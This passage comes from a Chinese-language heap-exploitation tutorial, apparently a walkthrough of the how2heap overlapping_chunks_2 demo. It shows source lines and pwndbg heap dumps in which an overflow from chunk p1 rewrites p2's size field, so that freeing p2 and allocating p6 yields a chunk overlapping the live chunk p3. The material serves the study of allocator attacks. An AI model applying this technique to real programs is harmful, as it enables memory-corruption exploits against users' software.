    chunk p3 from 0x220f7f0 to 0x220fbd8
    chunk p4 from 0x220fbe0 to 0x220ffc8
    chunk p5 from 0x220ffd0 to 0x22103b8
    Let's free the chunk p4.
    In this case this isn't coealesced with top chunk since we have p5 bordering top chunk after p4
    Let's trigger the vulnerability on chunk p1 that overwrites the size of the in use chunk p2
    with the size of chunk_p2 + size of chunk_p3
    Now during the free() operation on p2, the allocator is fooled to think that
    the nextchunk is p4 ( since p2 + size_p2 now point to p4 )
    This operation will basically create a big free chunk that wrongly includes p3
    Now let's allocate a new chunk with a size that can be satisfied by the previously freed chunk
    Our malloc() has been satisfied by our crafted big free chunk, now p6 and p3 are overlapping and
    we can overwrite data in p3 by writing on chunk p6
    chunk p6 from 0x220f400 to 0x220fbd8
    chunk p3 from 0x220f7f0 to 0x220fbd8
    Data inside chunk p3:

    Let's write something inside p6
    Data inside chunk p3:

###  关键部分调试
因为和之前的很类似,这里我仅下几个断点
       28   p2 = malloc(1000);
       29   p3 = malloc(1000);
       30   p4 = malloc(1000);
       31   p5 = malloc(1000);
       32
     ► 33   real_size_p1 = malloc_usable_size(p1);
       53   free(p4);
       54
     ► 55   fprintf(stderr, "nLet's trigger the vulnerability on chunk p1 that overwrites the size of the in use chunk p2nwith the size of chunk_p2 + size of chunk_p3n");
       57   *(unsigned int *)((unsigned char *)p1 + real_size_p1 ) = real_size_p2 + real_size_p3 + prev_in_use + sizeof(size_t) * 2; // heap
    0x603000 PREV_INUSE {
      prev_size = 0,
      size = 1009,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x6033f0 PREV_INUSE {
      prev_size = 0,
      size = 1009,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x6037e0 PREV_INUSE {
      prev_size = 0,
      size = 1009,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x603bd0 PREV_INUSE {
      prev_size = 0,
      size = 1009,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x603fc0 PREV_INUSE {
      prev_size = 0,
      size = 1009,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x6043b0 PREV_INUSE {
      prev_size = 0,
      size = 130129,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    pwndbg>
可以看到已经分配了5个堆块p1,p2,p3,p4,p5
分别从0x603000,0x6033f0,0x6037e0,0x603bd0,0x603fc0,0x6043b0处开始
然后我们继续运行一下,free掉p2,此时
    pwndbg> bins
    fastbins
    0x20: 0x0
    0x30: 0x0
    0x40: 0x0
    0x50: 0x0
    0x60: 0x0
    0x70: 0x0
    0x80: 0x0
    unsortedbin
    all: 0x603bd0 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x603bd0
    smallbins
    empty
    largebins
    empty
此时的chunk p2
    pwndbg> x/10gx 0x6033f0
    0x6033f0:       0x4141414141414141      0x00000000000003f1
    0x603400:       0x4242424242424242      0x4242424242424242
    0x603410:       0x4242424242424242      0x4242424242424242
    0x603420:       0x4242424242424242      0x4242424242424242
    0x603430:       0x4242424242424242      0x4242424242424242
    pwndbg> p/x 0x3f1
    $4 = 0x3f1
    pwndbg> p 0x3f1
    $5 = 1009
可以看到其size此时为0x3f1,而pre_size为chunk1所复用,紧接着我们继续,程序现在已经更改了chunk p2的size域
    pwndbg> x/10gx 0x6033f0
    0x6033f0:       0x4141414141414141      0x00000000000007e1
    0x603400:       0x4242424242424242      0x4242424242424242
    0x603410:       0x4242424242424242      0x4242424242424242
    0x603420:       0x4242424242424242      0x4242424242424242
    0x603430:       0x4242424242424242      0x4242424242424242
    pwndbg>
好了,现在我们free掉chunk2并malloc一个新的chunk p6
    0x6033f0 PREV_INUSE {
      prev_size = 4702111234474983745,
      size = 2017,
      fd = 0x7ffff7dd2158 ,
      bk = 0x7ffff7dd2158 ,
      fd_nextsize = 0x6033f0,
      bk_nextsize = 0x6033f0
    }
此时的p6 size大小为2017,我们看下
    pwndbg> p p6
    $8 = (intptr_t *) 0x603400
    pwndbg> p p3
    $9 = (intptr_t *) 0x6037f0
    pwndbg> p/x 2017
    $10 = 0x7e1
    pwndbg> p p6+0x7e1
    $11 = (intptr_t *) 0x607308
此时的p3已经成功被包在p6中了:)
###  总结
好了,程序首先malloc了5块大小为1008的chunk,p1,p2,p3,p4,p5
紧接着,程序free掉了p4,因为还有p5 紧邻着top chunk,因此p4并不会被合并到topchunk中
**这里要注意,在本例中,是否free p4的效果是一样的**
之后呢,为便于直观的看一下效果,将chunk按次序填满了A,B,C,D,E
紧接着,程序修改了chunk p2的size域大小为p2+p3,然后free掉了chunk p2
这个时候,系统会错误的把p2和p3合并的大chunk放进unsorted bin中并与我们的free chunk p4合并
然后申请了p2+p3大小的新chunk p6(所以我说其实不用free p4的…甚至都不用malloc p5 2333
此时p6的后半部分也就是p3大小的部分就与之前未free的p3重叠了:)
这里也做一下overlapping_chunks和overlapping_chunks_2的比较
overlapping_chunks中,程序更改了已经释放掉的chunk的size域而2则是修改了还未释放的chunk的size域,但是效果都是一样的,都是构造了一个重叠块
(overlapping chunk!